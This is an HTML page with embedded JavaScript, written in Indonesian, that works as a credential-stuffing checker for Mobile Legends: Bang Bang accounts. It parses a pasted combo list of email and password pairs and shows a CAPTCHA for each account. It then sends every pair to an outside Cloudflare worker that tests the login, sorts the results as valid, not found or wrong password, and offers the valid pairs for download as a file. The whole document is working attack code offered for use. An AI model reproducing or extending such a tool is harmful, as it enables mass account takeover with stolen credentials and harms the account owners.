<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MLBB Checker Sederhana</title>
  <script src="https://cstaticdun.126.net/load.min.js"></script>
  <style>
    body { font-family: Arial; max-width: 700px; margin: 20px auto; padding: 10px; }
    textarea { width: 100%; height: 150px; font-family: monospace; }
    #captcha-root { margin: 10px 0; }
    #log { background: #222; color: #eee; height: 250px; overflow-y: auto; padding: 8px; font-family: monospace; white-space: pre-wrap; }
    button { padding: 8px 14px; margin-right: 6px; cursor: pointer; }
    .ok { color: #7CFC00; }
    .bad { color: #FF6B6B; }
    .info { color: #FFD866; }
  </style>
</head>
<body>

<h2>MLBB Checker Sederhana</h2>
<p>Masukkan daftar akun (email|password per baris). Klik Start, lalu isi CAPTCHA manual untuk tiap akun.</p>

<textarea id="combo" placeholder="user1@example.com|Pass123&#10;user2@example.com|Pass456"></textarea>
<br>
<button id="startBtn">Start</button>
<button id="stopBtn" disabled>Stop</button>
<button id="downloadBtn">Download valid.txt</button>
<div id="status" style="margin-top:8px;"></div>

<div id="captcha-root"></div>

<h3>Log:</h3>
<div id="log"></div>

<script>
  const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af";
  const WORKER_URL = "https://mlbb-checker-worker.bonar7527.workers.dev";

  let combos = [];
  let currentIndex = 0;
  let stopRequested = false;
  let neCaptchaInstance = null;
  let validAccounts = [];

  const logEl = document.getElementById("log");
  const statusEl = document.getElementById("status");
  const startBtn = document.getElementById("startBtn");
  const stopBtn = document.getElementById("stopBtn");
  const downloadBtn = document.getElementById("downloadBtn");

  function appendLog(text, cls) {
    const time = new Date().toLocaleTimeString();
    const div = document.createElement("div");
    div.textContent = `[${time}] ${text}`;
    if(cls) div.className = cls;
    logEl.appendChild(div);
    logEl.scrollTop = logEl.scrollHeight;
  }

  function parseCombos(text) {
    return text.split(/\r?\n/)
      .map(l => l.trim())
      .filter(Boolean)
      .map(line => {
        if(line.includes("|")) {
          const [e,p] = line.split("|",2);
          return { email: e.trim(), password: p.trim() };
        } else if(line.includes(":")) {
          const [e,p] = line.split(":",2);
          return { email: e.trim(), password: p.trim() };
        } else {
          appendLog(`Format salah dilewati: ${line}`, "info");
          return null;
        }
      })
      .filter(Boolean);
  }

  function showCaptchaOnce() {
    return new Promise((resolve, reject) => {
      const root = document.getElementById("captcha-root");
      root.innerHTML = "";
      if(!window.initNECaptcha) {
        appendLog("initNECaptcha tidak tersedia", "info");
        reject("initNECaptcha missing");
        return;
      }

      if(neCaptchaInstance && typeof neCaptchaInstance.destroy === "function") {
        neCaptchaInstance.destroy();
        neCaptchaInstance = null;
      }

      try {
        initNECaptcha({
          captchaId: CAPTCHA_ID,
          element: "#captcha-root",
          mode: "embed",
          width: "320px",
          onReady() {},
          onVerify(err, data) {
            if(err) {
              appendLog("Error verify captcha: " + JSON.stringify(err), "info");
              reject(err);
              return;
            }
            if(!data || !data.validate) {
              appendLog("Token captcha kosong", "info");
              reject("no token");
              return;
            }
            const token = data.validate;
            if(neCaptchaInstance && typeof neCaptchaInstance.destroy === "function") {
              neCaptchaInstance.destroy();
              neCaptchaInstance = null;
            }
            resolve(token);
          },
          onLoad(instance) {
            neCaptchaInstance = instance;
          }
        });
      } catch(e) {
        appendLog("Gagal inisialisasi captcha: " + e, "info");
        reject(e);
      }
    });
  }

  async function checkOneAccount(account) {
    appendLog(`Minta captcha untuk ${account.email}`, "info");
    statusEl.textContent = `Checking ${currentIndex+1}/${combos.length}: ${account.email}`;
    const token = await showCaptchaOnce();

    appendLog(`Token captcha diterima`, "info");
    try {
      const form = new URLSearchParams();
      form.append("email", account.email);
      form.append("password", account.password);
      form.append("e_captcha", token);

      const resp = await fetch(WORKER_URL + "/check", {
        method: "POST",
        body: form,
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
      });

      if(!resp.ok) {
        appendLog(`HTTP error ${resp.status} untuk ${account.email}`, "bad");
        return;
      }
      const data = await resp.json();

      if(data.code === 0 && data.data) {
        appendLog(`VALID => ${account.email} | GUID: ${data.data.guid || "N/A"}`, "ok");
        validAccounts.push(`${account.email}|${account.password}`);
      } else if(data.code === 1004) {
        appendLog(`NOT FOUND => ${account.email}`, "bad");
      } else if(data.code === 1005) {
        appendLog(`WRONG PASSWORD => ${account.email}`, "bad");
      } else {
        appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`, "info");
      }

    } catch(e) {
      appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
    }
  }

  function updateTextareaCombos() {
    const remaining = combos.map(acc => `${acc.email}|${acc.password}`).join("\n");
    document.getElementById("combo").value = remaining;
  }

  async function startProcess() {
    stopRequested = false;
    startBtn.disabled = true;
    stopBtn.disabled = false;
    logEl.innerHTML = "";
    validAccounts = [];
    combos = parseCombos(document.getElementById("combo").value);

    if(combos.length === 0) {
      appendLog("Tidak ada akun untuk dicek", "info");
      startBtn.disabled = false;
      stopBtn.disabled = true;
      return;
    }

    appendLog(`Mulai cek ${combos.length} akun. Klik CAPTCHA tiap akun.`, "info");
    currentIndex = 0;

    while(currentIndex < combos.length) {
      if(stopRequested) {
        appendLog("Proses dihentikan user", "info");
        break;
      }
      const acc = combos[currentIndex];
      await checkOneAccount(acc);

      combos.splice(currentIndex, 1);
      updateTextareaCombos();
    }

    appendLog("Selesai", "info");
    statusEl.textContent = "Selesai";
    startBtn.disabled = false;
    stopBtn.disabled = true;
  }

  startBtn.addEventListener("click", startProcess);
  stopBtn.addEventListener("click", () => {
    stopRequested = true;
    stopBtn.disabled = true;
  });
  downloadBtn.addEventListener("click", () => {
    if(validAccounts.length === 0) {
      appendLog("Tidak ada akun valid untuk diunduh", "info");
      return;
    }
    const blob = new Blob([validAccounts.join("\n")], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "valid.txt";
    a.click();
    URL.revokeObjectURL(url);
  });
</script>

</body>
</html>
